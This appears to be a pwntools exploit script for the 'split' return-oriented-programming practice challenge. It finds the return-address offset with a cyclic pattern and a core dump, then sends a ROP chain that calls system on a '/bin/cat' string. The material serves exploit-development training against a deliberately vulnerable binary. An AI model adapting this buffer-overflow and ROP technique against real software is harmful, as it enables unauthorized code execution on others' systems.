#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

elf = context.binary = ELF('./split')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak pwnme
continue
'''.format(**locals())

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.log_level = 'debug'
context.delete_corefiles = True

print(f'address of usefulFunction : {hex(elf.symbols.usefulFunction)}')

# -- Exploit goes here --

io = process(elf.path)

payload = cyclic(100)
io.sendlineafter('>', payload)
io.wait()

# get core file
core = io.corefile
# get address of stack
stack = core.rsp
# read 4 bytes from top of stack
# these 4 bytes are overwritten pattern
pattern = core.read(stack, 4)
# get offset of $rip
rip_offset = cyclic_find(pattern)

# print info
print(f'offset of $rip : {rip_offset}')

pop_rdi = p64(0x00000000004007c3)
ret = p64(0x00000000004007c3+1)
bin_cat = p64(0x00601060)
system_call = p64(0x0040074b)
payload = flat(
    asm('nop')*rip_offset,
    pop_rdi, # get value in rdi
    bin_cat, # get
    system_call,
)

io = start()

io.sendlineafter('>', payload)
